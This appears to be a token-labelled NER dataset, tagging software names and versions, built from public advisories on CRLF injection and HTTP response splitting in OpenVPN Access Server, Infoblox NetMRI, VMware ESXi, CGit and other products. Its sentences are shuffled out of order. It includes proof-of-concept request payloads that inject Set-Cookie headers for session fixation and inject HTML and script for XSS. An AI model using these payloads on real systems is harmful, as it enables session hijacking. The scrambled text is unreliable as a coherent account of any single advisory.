An O
attacker O
could O
exploit O
this O
vulnerability O
by O
convincing O
a O
user O
to O
follow O
a O
malicious O
link O
or O
by O
intercepting O
a O
user O
request O
and O
injecting O
malicious O
code O
into O
the O
request O
. O

A O
vulnerability O
in O
the O
web O
framework O
of O
Cisco O
Small O
Business O
Managed O
Switches O
software O
could O
allow O
an O
unauthenticated O
, O
remote O
attacker O
to O
conduct O
an O
HTTP O
response O
splitting O
attack O
against O
a O
user O
of O
the O
web O
interface O
of O
an O
affected O
system O
. O

Cisco O
Bug O
IDs O
: O
CSCvg29980 O
. O

A O
successful O
exploit O
could O
allow O
the O
attacker O
to O
execute O
arbitrary O
script O
code O
in O
the O
context O
of O
the O
affected O
web O
interface O
or O
allow O
the O
attacker O
to O
access O
sensitive O
browser-based O
information O
. O

This O
vulnerability O
affects O
the O
following O
Cisco O
Small O
Business O
300 O
and O
500 O
Series O
Managed O
Switches O
: O
Cisco O
350 O
Series O
Managed O
Switches O
, O
Cisco O
350X O
Series O
Stackable O
Managed O
Switches O
, O
Cisco O
550X O
Series O
Stackable O
Managed O
Switches O
, O
Cisco O
ESW2 O
Series O
Advanced O
Switches O
, O
Cisco O
Small O
Business O
300 O
Series O
Managed O
Switches O
, O
Cisco O
Small O
Business O
500 O
Series O
Stackable O
Managed O
Switches O
. O

The O
vulnerability O
is O
due O
to O
insufficient O
input O
validation O
of O
some O
parameters O
that O
are O
passed O
to O
the O
web O
server O
of O
the O
affected O
system O
. O

ntopng SN
before SV
3.0 SV
allows O
HTTP O
Response O
Splitting O
. O

apt-cacher SN
before SV
1.7.15 SV
and O
apt-cacher-ng SN
before SV
3.4 SV
allow O
HTTP O
response O
splitting O
via O
encoded O
newline O
characters O
, O
related O
to O
lack O
of O
blocking O
for O
the O
% O
0 O
[ O
ad O
] O
regular O
expression O
. O

CRLF O
injection O
vulnerability O
in O
the O
web O
interface O
in O
OpenVPN SN
Access SN
Server SN
2.1.4 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
consequently O
conduct O
session O
fixation O
attacks O
and O
possibly O
HTTP O
response O
splitting O
attacks O
via O
% O
0A O
characters O
in O
the O
PATH_INFO O
to O
session_start O
/ O
. O

We O
also O
tried O
to O
exploit O
an O
HTTP O
Response O
Splitting O
attack O
without O
success O
, O
for O
now O
. O

Furthermore O
, O
this O
vulnerability O
allow O
us O
to O
exploit O
a O
session O
fixation O
attack O
. O

13/02/2017 O
: O
OpenVPN O
Team O
request O
to O
file O
a O
ticket O
on O
the O
Access O
Server O
support O
system O
. O

CRLF O
injection O
+ O
Session O
fixation O
OpenVPN-AS SN
( O
Version O
2.1.4 SV
) O
is O
prone O
to O
CRLF O
injection O
. O

In O
order O
to O
exploit O
this O
vulnerability O
, O
we O
followed O
the O
steps O
below O
: O
1 O
. O

06/02/2017 O
: O
First O
contact O
with O
OpenVPN O
Security O
team O
. O

04/05/2017 O
: O
Another O
and O
last O
attempt O
. O

Sent O
a O
malicious O
URL O
to O
the O
victim O
in O
order O
to O
set O
his O
session O
cookie O
. O

( O
IFX-370-42406 O
) O
17/02/2017 O
: O
Reply O
from O
the O
owner O
, O
acknowledging O
the O
vulnerability O
and O
planning O
to O
fix O
the O
vulnerabilities O
. O

`` O
` O
GET O
session_start O
/ O
% O
0aSet-Cookie O
: O
% O
20openvpn_sess O
ac42 O
; O
% O
20Path=/ O
% O
0aContent-Length O
: O
% O
200 O
% O
0a O
% O
0aHTTP/1.1 O
% O
20200 O
% O
20OK O
% O
0aContent-Type O
: O
% O
20text/html O
% O
0aContent-Length O
: O
% O
2017 O
% O
0a O
% O
0a O
< O
html O
> O
TEST O
< O
/html O
HTTP/1.1 O
Host O
: O
User-Agent O
: O
Mozilla/5.0 O
( O
X11 O
; O
Linux O
x86_64 O
; O
rv:45.0 O
) O
Gecko/20100101 O
Firefox/45.0 O
Accept O
: O
text/html O
, O
application/xhtml+xml O
, O
application/xml O
; O
q=0.9 O
, O
; O
q=0.8 O
Accept-Language O
: O
en-US O
, O
en O
; O
q=0.5 O
Connection O
: O
close O
Cookie O
: O
openvpn_sess O
dc61 O
Pragma O
: O
no-cache O
Cache-Control O
: O
no-cache O
`` O
` O
As O
we O
can O
see O
, O
it O
is O
possible O
to O
use O
multiple O
times O
the O
character O
% O
0A O
, O
in O
order O
to O
forge O
another O
response O
. O

Finally O
, O
as O
the O
attacker O
, O
we O
can O
access O
the O
OpenVPN-AS O
application O
with O
the O
rights O
of O
the O
victim O
( O
using O
the O
session O
cookie O
) O
. O

OpenVPN O
Access O
Server O
supports O
a O
wide O
range O
of O
configurations O
, O
including O
secure O
and O
granular O
remote O
access O
to O
internal O
network O
and O
or O
private O
cloud O
network O
resources O
and O
applications O
with O
fine-grained O
access O
control O
. O

21/04/2017 O
: O
New O
request O
for O
feedback O
. O

Credits O
Julien O
Boulet O
, O
Sysdream O
( O
j.boulet O
-at- O
sysdream O
-dot- O
com O
) O
SYSDREAM O
Labs O
< O
labs O
@ O
... O
dream.com O
GPG O
: O
47D1 O
E124 O
C43E O
F992 O
2A2E O
1551 O
8EB4 O
8CD9 O
D5B2 O
59A1 O
Website O
: O
Twitter O
: O
@ O
sysdream O

`` O
` O
HTTP/1.1 O
302 O
Found O
Date O
: O
Wed O
, O
18 O
Jan O
2017 O
10:29:23 O
GMT O
Connection O
: O
close O
Content-Type O
: O
text/html O
; O
charset=UTF-8 O
Location O
: O
Set-Cookie O
: O
openvpn_sess O
ac42 O
; O
Path= O
Content-Length O
: O
0 O
Content-Length O
: O
171 O
HTTP/1.1 O
200 O
OK O
Content-Type O
: O
text/html O
Content-Length O
: O
17 O
< O
html O
> O
TEST O
< O
/html O
Server O
: O
OpenVPN-AS O
3b O
< O
html O
< O
body O
< O
p O
> O
REDIRECT O
< O
/p O
< O
/body O
< O
/html O
0 O
`` O
` O
Solution O
The O
vendor O
didn O
t O
provided O
a O
patch O
for O
this O
vulnerability O
. O

Subject O
: O
[ O
CVE-2017-5868 O
] O
OpenVPN O
Access O
Server O
: O
CRLF O
injection O
with O
Session O
fixation O
OpenVPN O
Access O
Server O
: O
CRLF O
injection O
with O
Session O
fixation O
Description O
OpenVPN O
Access O
Server O
is O
a O
full O
featured O
secure O
network O
tunneling O
VPN O
software O
solution O
that O
integrates O
OpenVPN O
server O
capabilities O
, O
enterprise O
management O
capabilities O
, O
simplified O
OpenVPN O
Connect O
UI O
, O
and O
OpenVPN O
Client O
software O
packages O
that O
accommodate O
Windows O
, O
MAC O
, O
Linux O
, O
Android O
, O
and O
iOS O
environments O
. O

From O
the O
vendor O
side O
, O
several O
steps O
need O
to O
be O
taken O
: O
CRLF O
characters O
must O
be O
escaped O
Session O
cookie O
must O
be O
re-generated O
during O
the O
authentication O
Timeline O
( O
dd/mm/yyyy O
) O
18/01/2017 O
: O
Initial O
discovery O
. O

As O
the O
victim O
, O
access O
the O
OpenVPN-AS O
application O
in O
order O
to O
obtain O
a O
valid O
session O
cookie O
( O
at O
this O
point O
, O
the O
victim O
is O
not O
authenticated O
) O
. O

As O
an O
example O
, O
we O
aim O
to O
inject O
a O
Set-Cookie O
header O
with O
a O
known O
value O
openvpn_sess O
cf23 O
; O
Path=/ O
; O
Secure O
; O
HttpOnly O
`` O
` O
This O
URL O
will O
allow O
the O
attacker O
to O
choose O
the O
value O
of O
the O
session O
cookie O
of O
the O
victim O
. O

At O
this O
point O
, O
the O
victim O
needs O
to O
authenticate O
itself O
. O

Tries O
for O
an O
HTTP O
Response O
Splitting O
attack O

Threat O
Exploiting O
these O
vulnerabilities O
, O
we O
were O
able O
to O
steal O
a O
session O
from O
a O
victim O
and O
then O
access O
the O
application O
( O
OpenVPN-AS O
) O
with O
his O
rights O
. O

CVE O
ID O
: O
CVE-2017-5868 O
Access O
Vector O
: O
network O
Security O
Risk O
: O
medium O
Vulnerability O
: O
CWE-113 O
, O
CWE-93 O
, O
CWE-384 O
CVSS O
Base O
Score O
: O
5.3 O
( O
Medium O
) O
CVSS O
Vector O
: O
CVSS:3.0/AV O
: O
N/AC O
: O
H/PR O
: O
N/UI O
: O
R/S O
: O
U/C O
: O
H/I O
: O
L/A O
: O
L O
CRLF O
injection O
It O
is O
possible O
to O
inject O
a O
CRLF O
character O
like O
` O
% O
0A` O
using O
the O
URL O
GET O
session_start O
/ O
% O
0atest O
HTTP/1.1 O
Host O
: O
User-Agent O
: O
Mozilla/5.0 O
( O
X11 O
; O
Linux O
x86_64 O
; O
rv:45.0 O
) O
Gecko/20100101 O
Firefox/45.0 O
Accept O
: O
text/html O
, O
application/xhtml+xml O
, O
application/xml O
; O
q=0.9 O
, O
; O
q=0.8 O
Accept-Language O
: O
en-US O
, O
en O
; O
q=0.5 O
Connection O
: O
close O
Cookie O
: O
openvpn_sess O
dc61 O
Pragma O
: O
no-cache O
Cache-Control O
: O
no-cache O
`` O
` O
As O
a O
result O
, O
we O
obtained O
this O
response O
from O
the O
server O
HTTP/1.1 O
302 O
Found O
Date O
: O
Wed O
, O
18 O
Jan O
2017 O
10:19:46 O
GMT O
Connection O
: O
close O
Content-Type O
: O
text/html O
; O
charset=UTF-8 O
Location O
: O
test O
Server O
: O
OpenVPN-AS O
< O
html O
< O
body O
< O
p O
> O
REDIRECT O
< O
/p O
< O
/body O
< O
/html O
`` O
` O
Thus O
, O
the O
` O
% O
0A` O
character O
is O
taken O
into O
account O
and O
we O
can O
clearly O
see O
the O
test O
string O
at O
an O
unexpected O
location O
. O

We O
have O
not O
been O
able O
to O
exploit O
it O
but O
the O
application O
may O
be O
prone O
to O
HTTP O
Response O
Splitting O
attacks O
. O

Exploiting O
this O
on O
an O
administrator O
account O
may O
lead O
to O
serious O
consequences O
. O

Date O
: O
Tue O
, O
23 O
May O
2017 O
15:03:32 O
+0200 O
From O
: O
Sydream O
Labs O
< O
labs O
@ O
... O
dream.com O
To O
: O
fulldisclosure O
@ O
... O
lists.org O
Cc O
: O
oss-security O
@ O
... O
ts.openwall.com O
, O
support O
@ O
... O
nvpn.net O

Using O
a O
CRLF O
injection O
in O
order O
to O
do O
a O
session O
fixation O
attack O
Using O
the O
CRLF O
injection O
and O
a O
problem O
during O
the O
authentication O
phase O
( O
the O
session O
cookie O
is O
not O
re-generated O
) O
, O
we O
were O
able O
to O
successfully O
exploit O
a O
session O
fixation O
vulnerability O
. O

Restrict O
access O
to O
the O
web O
interface O
( O
for O
instance O
, O
IP O
whitelisting O
) O
. O

However O
, O
several O
solutions O
can O
be O
taken O
: O
Use O
a O
Reverse O
Proxy O
in O
order O
to O
restrict O
CRLF O
characters O
in O
URI O
. O

His O
profile O
( O
and O
rights O
) O
will O
then O
be O
associated O
with O
the O
session O
cookie O
controlled O
by O
the O
attacker O
. O

29/03/2017 O
: O
Sysdream O
Labs O
request O
for O
an O
ETA O
, O
warning O
for O
public O
disclosure O
. O

23/05/2017 O
: O
Public O
disclosure O
. O

Using O
the O
character O
% O
0A O
, O
it O
is O
possible O
to O
inject O
headers O
and O
content O
. O

Indeed O
, O
during O
the O
authentication O
the O
session O
cookie O
is O
poorly O
handled O
. O

Subject O
: O
[ O
CVE-2017-5868 O
] O
OpenVPN O
Access O
Server O
: O
CRLF O
injection O
with O
Session O
fixation O

CRLF O
injection O
vulnerability O
in O
Infoblox SN
Network SN
Automation SN
NetMRI SN
before SV
7.1.1 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
contentType O
parameter O
in O
a O
login O
action O
to O
config/userAdmin/login.tdf O
. O

The O
POST O
of O
the O
login O
action O
contains O
the O
following O
parameters O
, O
and O
the O
contentType O

Vendor O
responds O
saying O
CSRF O
already O
fixed O
in O
7.0.1 O
, O
XSS O
and O
HTTP O
Splitting O
to O
be O
fixed O
in O
upcoming O
7.1.1 O
- O
expected O
release O
in O
summer O
. O

Description O
: O
Infoblox O
also O
offers O
a O
complementary O
, O
powerful O
network O
automation O
platform O
which O
enables O
discovery O
, O
switch O
port O
management O
, O
network O
change O
configuration O
and O
compliance O
management O
for O
multi-vendor O
network O
devices O
. O

30/06/2016 O
- O
Patch O
7.1.1 O
released O
06/09/2016 O
- O
Public O
disclosure O
( O
4 O
) O
Solution O
: O
Upgrade O
to O
Version O
7.1.1 O
( O
5 O
) O
Credits O
: O
Discovered O
by O
Alex O
Haynes O

Automation O
cuts O
down O
administrator O
workload O
and O
reduces O
risk O
of O
network O
outages O
due O
to O
improper O
configurations O
or O
changes O
. O

Vendor O
responds O
and O
opens O
support O
ticket O
for O
vulnerabilities O
, O
mentioning O
they O
will O
look O
into O
vulnerabilities O
. O

Tested O
Version O
: O
6.9.2 SV
Advisory O
Publication O
: O
06/09/2016 O
Vulnerability O
Type O
: O
[ O
CWE-113 O
: O
] O
Improper O
Neutralization O
of O
CRLF O
Sequences O
in O
HTTP O
Headers O
( O
HTTP O
Response O
Splitting O
) O
CVE O
Reference O
: O
CVE-2016-6484 O
Credit O
: O
Alex O
Haynes O
Advisory O
Details O
: O
( O
1 O
) O

( O
2 O
) O
Vulnerability O
Details O
: O
The O
login O
page O
of O
netmri O
is O
vulnerable O
to O
a O
HTTP O
splitting/CRLF O
injection O
. O

Response O
requesting O
further O
information O
. O

05/04/2016 O
- O
Request O
update O
from O
vendor O
on O
status O
of O
vulnerabilities O
. O

: O
% O
0a O
and O
line O
feed O

08/02/2016 O
- O
follow O
up O
e-mail O
requesting O
update O
. O

01/02/2016 O
- O
Follow O
up O
e-mail O
to O
inform O
them O
of O
vulnerabilities O
. O

No O
response O
. O

We O
can O
then O
introduce O
our O
own O
HTML O
and/or O
javascript O
to O
provoke O
a O
HTML O
injection O
or O
cross-site O
scripting O
attack O
. O

Vendor O
URL O
& O
Download O
: O
Product O

Vulnerable O
Versions O
: O
7.0.1 SV
and O
all O
previous O
versions O

14/03/2016 O
- O
vendor O
responds O
saying O
they O
are O
able O
to O
reproduce O
vulnerabilities O
17/03/2016 O
- O

Vendor O
: O
Infoblox O
Product O
& O
Version O
: O
Infoblox SN
Network SN
Automation SN
v7.0.1 SV

Exploit O
Title O
: O
[ O
CVE-2016-6484 O
] O
Infoblox O
Network O
Automation O
CRLF O
Injection O
HTTP O
splitting O
vulnerability O
Product O
: O
Infoblox O
Network O
Automation O

10/03/2016 O
- O
Final O
follow O
up O
to O
vendor O
requesting O
an O
update O
. O

parameter O
can O
be O
modified O
to O
be O
reflected O
in O
the O
response O
header O
: O
skipjackPassword=test O
& O
width=100 O
& O
contentType=application/xml O
& O
msg=Please+w O
ait+while+your+credentials+are+validated O
... O
& O
url= O
% O
2Fnetmri O
% O
2Fconfig O
% O
2Fuse O
rAdmin O
% O
2Flogin.tdf O
& O
mode=DO-LOGIN O
& O
skipjackUsername=test O
& O
multipartFile= O
& O
ti O
tle=Waiting+For+Process O
& O
filename= O
& O
licenseFile=input.licenseFile O
& O
authServ O
erList=192.168.X.X O
% O
2C+10.X.X.X O
Once O
we O
control O
content-type O
, O
we O
can O
inject O
carriage O
return O

01/02/2016 O
- O
Information O
on O
vulnerabilities O
sent O
to O
vendor O
. O

: O
skipjackPassword=test O
& O
width=100 O
& O
contentType= O
% O
0d O
% O
0aContentLength O
: O
% O
2019 O
% O
0d O
% O
0a O
% O
0d O
% O
0a O
< O
html O
> O
< O
h1 O
> O
Injected O
HTML O
< O
/h1 O
> O
< O
script O
> O
alert O
( O
xss O
) O
; O
< O
/script O
> O
< O
! O

24/02/2016 O
- O
Follow O
up O
with O
vendor O
on O
vulnerabilities O
requesting O
an O
update O
. O

Vendor O
responds O
saying O
some O
of O
the O
vulnerabilities O
are O
already O
fixed O
in O
version O
7.0.4 O
but O
can O
not O
confirm O
which O
ones O
. O

Vendor O
responds O
asking O
us O
to O
open O
a O
support O
ticket O
. O

< O
/html O
& O
msg=Please+wait+while+your+credentials+are+validated O
... O
& O
url= O
% O
2Fnetmri O
% O
2 O
Fconfig O
% O
2FuserAdmin O
% O
2Flogin.tdf O
& O
mode=DO-LOGIN O
& O
skipjackUsername=test O
& O
mult O
ipartFile= O
& O
title=Waiting+For+Process O
& O
filename= O
& O
licenseFile=input.license O
File O
& O
authServerList=192.168.X.X O
% O
2C+10.X.X.X O
( O
3 O
) O
Advisory O
Timeline O
: O
25/01/2016 O
- O
First O
Contact O
informing O
vendor O
of O
vulnerabilities O
. O

: O
% O
0d O
characters O
to O
break O
the O
header O
and O
introduce O
our O
own O
, O
effectively O
splitting O
the O
response O
. O

write O
to O
vendor O
to O
explain O
situation O
. O

12/02/2016 O
- O
Infoblox O
products O
out O
of O
support O
so O
can O
not O
raise O
ticket O
. O

Vendor O
& O
Product O
Description O

[ O
CVE-2016-6484 O
] O
Infoblox O
Network O
Automation O
CRLF O
Injection O
HTTP O
splitting O

CRLF O
injection O
vulnerability O
in O
VMware SN
vCenter SN
Server SN
6.0 SV
before SV
U2 SV
and O
ESXi SN
6.0 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

The O
latest O
version O
of O
this O
security O
advisory O
is O
available O
on O
the O
SySS O
Web O
site O
. O

VMware O
vSphere O
Hypervisor O
is O
based O
on O
VMware O
ESXi O
, O
the O
hypervisor O
architecture O
that O
sets O
the O
industry O
standard O
for O
reliability O
and O
performance O
. O

Details O
of O
this O
security O
advisory O
may O
be O
updated O
in O
order O
to O
provide O
as O
accurate O
information O
as O
possible O
. O

Vulnerability O
Details O
: O
The O
SySS O
GmbH O
found O
out O
that O
the O
web O
server O
of O
VMware O
ESXi O
6 O
is O
vulnerable O
to O
HTTP O
response O
injection O
attacks O
, O
as O
arbitrarily O
supplied O
URL O
parameters O
are O
copied O
in O
the O
HTTP O
header O
Location O
of O
the O
server O
response O
without O
sufficient O
input O
validation O
. O

Affected O
Version O
( O
s O
) O
: O
VMware SN
ESXi SN
6.0.0 SV
build SV
3380124 SV
( O
Update SV
1 SV
) O
VMware SN
vCenter SN
Server SN
6.0 SV
U2 SV

BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA512 O
Advisory O
ID O
: O
SYSS-2016-063 O
Product O
: O
VMware O
vSphere O
Hypervisor O
( O
ESXi O
) O
Manufacturer O
: O
VMware O
, O
Inc O
. O

If O
such O
a O
URL O
is O
visited O
by O
a O
victim O
, O
it O
may O
for O
example O
be O
possible O
to O
set O
web O
browser O
cookies O
in O
the O
victim O
web O
browser O
, O
execute O
arbitrary O
JavaScript O
code O
, O
or O
poison O
caches O
of O
proxy O
servers O
. O

Disclosure O
Timeline O
: O
2016-07-01 O
: O
Vulnerability O
reported O
to O
manufacturer O
2016-07-01 O
: O
Manufacturer O
acknowledges O
e-mail O
with O
SySS O
security O
advisory O
2016-07-14 O
: O
Manufacturer O
further O
investigates O
the O
reported O
security O
issue O
2016-07-22 O
: O
Manufacturer O
announces O
disclosure O
of O
this O
security O
issue O
2016-08-04 O
: O
Public O
release O
of O
VMware O
security O
advisory O
VMSA-2016-0010 O
and O
security O
update O
2016-08-05 O
: O
Public O
release O
of O
SySS O
security O
advisory O
References O
: O
Product O
website O
for O
VMware O
vSphere O
Hypervisor O
( O
ESXi O
) O
re/vmware_vsphere_hypervisor_esxi/6_0 O
SySS O
Security O
Advisory O
SYSS-2016-063 O
16-063.txt O
SySS O
Responsible O
Disclosure O
Policy O
VMware O
Security O
Advisory O
VMSA-2016-0010 O
Credits O
: O
This O
security O
vulnerability O
was O
independently O
found O
and O
reported O
by O
Matthias O
Deeg O
of O
SySS O
GmbH O
, O
Vladimir O
Ivanov O
, O
Andrey O
Evlanin O
, O
Mikhail O
Stepankin O
, O
Artem O
Kondratenko O
, O
Arseniy O
Sharoglazov O
of O
Positive O
Technologies O
, O
Matt O
Foster O
of O
Netcraft O
Ltd O
, O
Eva O
Esteban O
Molina O
of O
A2secure O
and O
Ammarit O
Thongthua O
( O
see O
) O
. O

Tested O
Version O
( O
s O
) O
: O
VMware SN
ESXi SN
6.0.0 SV
build SV
3380124 SV
( O
Update SV
1 SV
) O
Vulnerability O
Type O
: O
Improper O
Input O
Validation O
( O
CWE-20 O
) O
Risk O
Level O
: O
Medium O
Solution O
Status O
: O

The O
manufacturer O
describes O
the O
product O
as O
follows O
( O
see O
) O
: O
Virtualize O
even O
the O
most O
resource-intensive O
applications O
with O
peace O
of O
mind O
. O

Depending O
on O
the O
context O
, O
this O
allows O
different O
attacks O
. O

Proof O
of O
Concept O
( O
PoC O
) O
: O
The O
following O
URL O
is O
a O
simple O
attack O
vector O
to O
illustrate O
the O
HTTP O
response O
header O
injection O
vulnerability O
by O
setting O
an O
attacker-controlled O
session O
cookie O
named O
test O
with O
the O
value O
31337 O
within O
the O
victim O
web O
browser O
: O
The O
corresponding O
HTTP O
GET O
request O
and O
the O
VMware O
ESXi O
web O
server O
response O
are O
as O
follows O
: O
GET O
syss O
% O
0d O
% O
0aset-cookie O
: O
test=31337 O
% O
0d O
% O
0at=1 O
HTTP/1.1 O
Host O
: O
< O
HOST O
User-Agent O
: O
Mozilla/5.0 O
( O
X11 O
; O
Linux O
x86_64 O
; O
rv:47.0 O
) O
Gecko/20100101 O
Firefox/47.0 O
Accept O
: O
text/html O
, O
application/xhtml+xml O
, O
application/xml O
; O
q=0.9 O
, O
; O
q=0.8 O
Accept-Language O
: O
en-US O
, O
en O
; O
q=0.5 O
Accept-Encoding O
: O
gzip O
, O
deflate O
, O
br O
Connection O
: O
close O
HTTP/1.1 O
303 O
See O
Other O
Date O
: O
Thu O
, O
30 O
Jun O
2016 O
15:12:23 O
GMT O
Connection O
: O
close O
Location O
: O
syss O
set-cookie O
: O
test=31337 O
t=1 O
X-Frame-Options O
: O
DENY O
Content-Length O
: O
0 O
Solution O
: O
The O
manufacturer O
VMware O
has O
fixed O
the O
reported O
security O
vulnerability O
and O
disclosed O
detailed O
information O
about O
the O
issue O
and O
a O
software O
update O
for O
affected O
products O
in O
its O
security O
advisory O
VMSA-2016-0010 O
. O

Copyright O
: O
Creative O
Commons O
- O
Attribution O
( O
by O
) O
- O
Version O
3.0 O
URL O
: O
BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v2 O
iQIcBAEBCgAGBQJXpF3hAAoJENmkv2o0rU2rJr0P/RYc3j268fzTLERUG5CvLKYV O
HNI1a4p2/Mg0lzc/n1/7aZOzX9eRQe0jVyFkv90/843IWCdofQU3aqLBwFSIsFZP O
C9Tv3JYpk4T68uzCIriqxqHgt+qza1evfmPTOP2RHua0iaOOQSohzY/cWo3Uc9Yj O
Qag+JmnwPWZJNzkL1i41F6oO6aKurM65XBtmAdKQVQwwJ1WYMpiM3vV71hIq18sO O
OSJOgKQQMAR/1U7UVd3IgFIUv4+2mdDPyEdlnzPiTtpmJvZQf8H3k9054auCWBWa O
U2WOesD5FsCS4nBmuvlTc+jALlqC2SRRgR1UpiEvXTYYunWrOFustGnj4fFvgg7S O
omtMdN8dnWdD6BXZXg2k/yVH0WToVWtwV0meKtSg9b0jOywKBVzoYO19vpchHaz4 O
/Eyxd8HQHpToM3OgwHagFXosF3TGxwQySPlDHdQD5gYANzDBhS8uQ02Gwx2v9NCX O
cC/jbTDUC0fa2qNJL/wwN7unqmrdOkGEYlvTjme6wlDR5axB46GunSH5yNg5OKFl O
G1s7lZ+ZbcywBxScLx1k7ITa1tNL3PNet5/Ld6A1hi3yhONmRgkyfgB+YqN04xaR O
3b5U6eqnPfm8d52yVPa7zySVc1vN9mrQ87dCmnXWGE9xk++SXoeDLv3PbKrY65Iy O
w/x007duLbe7k/xSJ1Ip O
=/k7W O
END O
PGP O
SIGNATURE O

Due O
to O
improper O
input O
validation O
, O
the O
web O
server O
of O
VMware O
ESXi O
6 O
is O
prone O
to O
HTTP O
response O
injection O
attacks O
. O

E-Mail O
: O
matthias.deeg O
( O
at O
) O
syss.de O
Public O
Key O
: O
g.asc O
Key O
fingerprint O
= O
D1F0 O
A035 O
F06C O
E675 O
CDB9 O
0514 O
D9A4 O
BF6A O
34AD O
4DAB O
Disclaimer O
: O
The O
information O
provided O
in O
this O
security O
advisory O
is O
provided O
as O
is O
and O
without O
warranty O
of O
any O
kind O
. O

Thus O
, O
an O
attacker O
can O
create O
a O
specially O
crafted O
URL O
with O
a O
specific O
URL O
parameter O
that O
injects O
attacker-controlled O
data O
to O
the O
response O
of O
the O
VMware O
ESXi O
web O
server O
. O

Fixed O
Manufacturer O
Notification O
: O
2016-07-01 O
Solution O
Date O
: O
2016-08-04 O
Public O
Disclosure O
: O
2016-08-05 O
CVE O
Reference O
: O
CVE-2016-5331 O
Authors O
of O
Advisory O
: O
Matthias O
Deeg O
( O
SySS O
GmbH O
Overview O
: O
VMware O
vSphere O
Hypervisor O
is O
a O
type-1 O
hypervisor O
for O
serving O
virtual O
machines O
. O

[ O
SYSS-2016-063 O
] O
VMware SN
ESXi SN
6 SV
- O
Improper O
Input O
Validation O
( O
CWE-20 O
) O

CRLF O
injection O
vulnerability O
in O
Ecava SN
IntegraXor SN
before SV
5.0 SV
build SV
4522 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
URL O
. O

CRLF O
injection O
vulnerability O
in O
the O
cgit_print_http_headers O
function O
in O
ui-shared.c O
in O
CGit SN
before SV
0.12 SV
allows O
remote O
attackers O
with O
permission O
to O
write O
to O
a O
repository O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
or O
cross-site O
scripting O
( O
XSS O
) O
attacks O
via O
newline O
characters O
in O
a O
filename O
. O

Subject O
: O
CVE O
Request O
: O
CGit O
- O
Multiple O
vulnerabilities O

This O
has O
been O
fixed O
by O
adding O
a O
configuration O
option O
, O
enable-html-serving O
, O
which O
is O
by O
default O
off O
: O
This O
flag O
sets O
anti-sniffing O
, O
CSP O
, O
and O
restricts O
mimetypes O
to O
non- O
application O
( O
except O
for O
application/pdf O
and O
application/octet-stream O
) O
and O
non- O
text O
( O
except O
for O
text/plain O
) O
. O

This O
has O
been O
fixed O
by O
this O
commit O
: O
A O
new O
version O
containing O
these O
security O
fixes O
will O
be O
published O
shortly O
. O

Thanks O
, O
Jason O

Hi O
folks O
, O
Krzysztof O
Katowicz-Kowalewski O
from O
ESET O
, O
Erik O
Cabetas O
from O
Include O
Security O
, O
and O
myself O
( O
Jason O
Donenfeld O
) O
from O
Edge O
Security O
, O
have O
found O
a O
few O
vulnerabilities O
in O
CGit O
: O
1 O
. O

While O
this O
is O
ordinarily O
not O
a O
problem O
for O
single-use O
users O
- O
and O
indeed O
some O
users O
rather O
like O
being O
able O
to O
serve O
html O
from O
cgit O
- O
sites O
that O
allow O
potentially O
malicious O
third O
party O
users O
may O
not O
find O
this O
behavior O
desirable O
. O

Integer O
Overflow O
resulting O
in O
Buffer O
Overflow O
[ O
Cabetas O
] O
ctx.env.content_length O
is O
an O
unsigned O
int O
, O
coming O
from O
the O
CONTENT_LENGTH O
environment O
variable O
, O
which O
is O
parsed O
by O
strtoul O
. O

This O
has O
been O
fixed O
by O
properly O
escaping O
filenames O
in O
headers O
: O
Additionally O
, O
while O
the O
redirect O
for O
the O
/about O
- O
/about O
page O
does O
not O
appear O
to O
be O
vulnerable O
due O
to O
mitigating O
conditions O
, O
the O
following O
commit O
was O
made O
to O
similarly O
harden O
potential O
injections O
here O
: O
3 O
. O

Stored O
Cross O
Site O
Scripting O
in O
Git O
Repo O
Files O
[ O
Katowicz-Kowalewski O
] O
A O
user O
who O
has O
write O
access O
to O
the O
git O
repository O
can O
add O
HTML O
pages O
and O
then O
serve O
them O
with O
an O
HTML O
mimetype O
. O

Date O
: O
Thu O
, O
14 O
Jan O
2016 O
15:21:36 O
+0100 O
From O
: O
Jason O
A. O
Donenfeld O
< O
Jason O
@ O
... O
c4.com O
To O
: O
cgit O
@ O
... O
ts.zx2c4.com O
< O
cgit O
@ O
... O
ts.zx2c4.com O
> O
, O
oss-security O
< O
oss-security O
@ O
... O
ts.openwall.com O
Cc O
: O
Daniel O
Chromek O
< O
chromek O
@ O
... O
t.sk O
> O
, O
Krzysztof O
Katowicz-Kowalewski O
< O
krzysztof.kowalewski O
@ O
... O
t.pl O
> O
, O
Erik O
Cabetas O
< O
erik O
@ O
... O
ludesecurity.com O
> O
, O
Konstantin O
Ryabitsev O
< O
mricon O
@ O
... O
nel.org O

The O
HTTP/1.1 O
spec O
says O
that O
any O
Content-Length O
greater O
than O
or O
equal O
to O
zero O
is O
a O
valid O
value O
. O

Stored O
Cross O
Site O
Scripting O
& O
Header O
Injection O
in O
Filename O
Parameter O
[ O
Donenfeld O
] O
A O
user O
who O
has O
write O
access O
to O
the O
git O
repository O
could O
create O
filenames O
containing O
new O
lines O
that O
would O
result O
in O
that O
filename O
, O
including O
the O
newlines O
, O
being O
included O
in O
a O
header O
, O
resulting O
in O
header O
injection O
and O
eventually O
XSS O
. O

A O
user O
could O
therefore O
upload O
pages O
with O
malicious O
javascript O
executing O
in O
the O
same O
origin O
as O
the O
cgit O
web O
site O
. O

Reflected O
Cross O
Site O
Scripting O
& O
Header O
Injection O
in O
Mimetype O
Query O
String O
[ O
Katowicz-Kowalewski O
] O
The O
ui-blob O
handler O
accepted O
a O
mimetype O
as O
a O
query O
string O
and O
then O
echoed O
this O
string O
verbatim O
back O
. O

If O
you O
have O
a O
better O
idea O
of O
what O
sort O
of O
white/black O
list O
to O
use O
for O
this O
, O
I O
am O
open O
to O
suggestions O
. O

By O
storing O
this O
unsigned O
int O
into O
an O
int O
, O
we O
potentially O
overflow O
it O
, O
resulting O
in O
the O
following O
bounding O
check O
failing O
, O
leading O
